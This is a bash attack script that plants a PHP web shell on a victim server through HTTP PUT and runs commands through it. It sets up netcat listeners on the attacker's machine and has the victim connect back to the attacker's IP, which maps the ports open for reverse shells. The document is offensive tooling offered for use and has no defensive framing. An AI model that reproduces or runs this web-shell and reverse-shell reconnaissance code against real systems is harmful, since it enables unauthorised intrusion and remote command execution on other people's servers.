#!/bin/bash
# A simple bash script to run on a victim machine to check which ports are able to be used for reverse shells
# needs to have a php backdoor and PUT capabilities
# if assistance is needed obtaining this use the pseudo-shell.sh script first

# Exec funtion to create a psuedo terminal
exec () {
        payload="<?php echo shell_exec('$1 2>&1'); ?>";
        curl --silent -X PUT <Target URL/fbiopenup.php> -H 'Expect: ' -d "$payload";
        result=$(curl <Target URL/fbiopenup.php> 2>/dev/null)
}

target_ports="<ports you want to test>"
for port in $target_ports; do

	#open a listener on attacking machine
	nc -nvlp $port >/dev/null 2>&1 &
	listener_pid=$!

	#connection attempt by victim machine
	exec "nc -w 1 -z <attack ip> $port && echo [*] Port $port is open || [x] Port $port is closed"
	echo $result

	# kill the listener on the attacking machine
	kill $listener_pid 2>/dev/null
done

	


